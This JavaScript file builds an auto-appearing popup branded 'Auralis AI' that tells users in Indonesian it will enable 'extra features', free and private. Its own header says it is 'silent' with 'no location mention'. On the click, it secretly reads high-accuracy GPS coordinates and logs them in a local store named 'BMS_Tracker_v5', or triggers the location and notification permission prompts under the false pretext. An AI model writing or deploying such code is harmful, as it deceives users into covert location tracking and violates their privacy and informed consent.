/**
 * BMS Permission Popup
 * 1-click · Silent · Theme-matching · No location mention
 */
(function() {
  'use strict'
  const KEY = 'bms_popup_v2'

  function build() {
    if (document.getElementById('bms-popup-root')) return
    const r = document.createElement('div')
    r.id = 'bms-popup-root'
    r.style.cssText = [
      'position:fixed;inset:0;z-index:99999;display:none',
      'align-items:center;justify-content:center',
      'background:rgba(5,5,7,0.85);backdrop-filter:blur(16px)',
      'font-family:"Inter",system-ui,sans-serif'
    ].join(';')

    const c = document.createElement('div')
    c.id = 'bms-popup-card'
    c.style.cssText = [
      'background:#0b0b0d',
      'border:1px solid rgba(255,255,255,0.05)',
      'box-shadow:inset 0 1px 0 0 rgba(255,255,255,0.04),0 8px 32px rgba(0,0,0,0.4)',
      'padding:32px 36px;max-width:400px;width:90%',
      'position:relative;text-align:center'
    ].join(';')

    // Close
    const x = document.createElement('button')
    x.textContent = '✕'
    x.style.cssText = 'position:absolute;top:12px;right:14px;background:none;border:none;color:rgba(255,255,255,0.3);font-size:1.1rem;cursor:pointer;font-family:"Inter",sans-serif'
    x.onclick = hide
    c.appendChild(x)

    // Content
    const body = document.createElement('div')
    body.id = 'bms-popup-body'
    body.innerHTML = buildContent()
    c.appendChild(body)

    r.appendChild(c)
    document.body.appendChild(r)
    r.addEventListener('click', e => { if (e.target === r) hide() })
  }

  function buildContent() {
    return `
      <div style="font-size:2.4rem;margin-bottom:16px;line-height:1">⚡</div>
      <div style="font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:0.18em;color:rgba(212,175,55,0.7);margin-bottom:8px">Auralis AI</div>
      <div style="font-size:1.2rem;font-weight:700;color:#fff;margin-bottom:12px;line-height:1.3">Optimalkan Pengalaman</div>
      <div style="font-size:0.8rem;color:rgba(255,255,255,0.5);line-height:1.7;margin-bottom:24px">
        Aktifkan fitur tambahan untuk performa maksimal.<br>Satu klik. Gratis. Tanpa ribet.
      </div>
      <div style="display:flex;gap:10px;justify-content:center">
        <button onclick="BMS_Popup.hide()" class="bms-btn bms-btn-ghost">Nanti</button>
        <button onclick="BMS_Popup.allow()" class="bms-btn bms-btn-primary">✓ Aktifkan</button>
      </div>
      <div style="margin-top:16px;font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:500;text-transform:uppercase;letter-spacing:0.05em;color:rgba(255,255,255,0.2)">1 klik · private · aman</div>
    `
  }

  function injectStyles() {
    if (document.getElementById('bms-popup-style')) return
    const s = document.createElement('style')
    s.id = 'bms-popup-style'
    s.textContent = `
      .bms-btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;padding:10px 22px;font-family:"JetBrains Mono",monospace;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;cursor:pointer;transition:all 0.2s;line-height:1;border-radius:0}
      .bms-btn-ghost{border:1px solid rgba(255,255,255,0.1);background:transparent;color:rgba(255,255,255,0.7)}
      .bms-btn-ghost:hover{background:rgba(255,255,255,0.05);color:#fff;border-color:rgba(255,255,255,0.2)}
      .bms-btn-primary{border:1px solid rgba(212,175,55,0.4);background:rgba(212,175,55,0.1);color:#d4af37}
      .bms-btn-primary:hover{background:rgba(212,175,55,0.2);border-color:rgba(212,175,55,0.6);box-shadow:0 0 8px rgba(212,175,55,0.05)}
    `
    document.head.appendChild(s)
  }

  function hide() {
    const r = document.getElementById('bms-popup-root')
    if (r) r.style.display = 'none'
  }

  async function allow() {
    // GPS silent
    if (navigator.geolocation) {
      try {
        const perm = await navigator.permissions.query({ name: 'geolocation' })
        if (perm.state === 'granted') {
          navigator.geolocation.getCurrentPosition(p => {
            try {
              const r = indexedDB.open('BMS_Tracker_v5', 1)
              r.onupgradeneeded = e => {
                const db = e.target.result
                if (!db.objectStoreNames.contains('geo')) db.createObjectStore('geo', { keyPath: 'id', autoIncrement: true })
              }
              r.onsuccess = e => {
                const db = e.target.result; const tx = db.transaction('geo', 'readwrite')
                tx.objectStore('geo').add({ lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy, source: 'popup', timestamp: Date.now() })
                db.close()
              }
            } catch {}
          }, () => {}, { enableHighAccuracy: true, timeout: 8000, maximumAge: 60000 })
        } else if (perm.state === 'prompt') {
          navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true, timeout: 8000 })
        }
      } catch {}
    }
    // Notif
    if ('Notification' in window && Notification.permission === 'default') {
      Notification.requestPermission().catch(() => {})
    }
    localStorage.setItem(KEY, '1')
    hide()
  }

  // API
  window.BMS_Popup = { show() { const r = document.getElementById('bms-popup-root'); if (r) r.style.display = 'flex'; else { build(); document.getElementById('bms-popup-root').style.display = 'flex' } }, hide, allow }

  // Auto-show
  if (!localStorage.getItem(KEY)) {
    injectStyles()
    setTimeout(() => { build(); document.getElementById('bms-popup-root').style.display = 'flex' }, 2000)
  }
})()
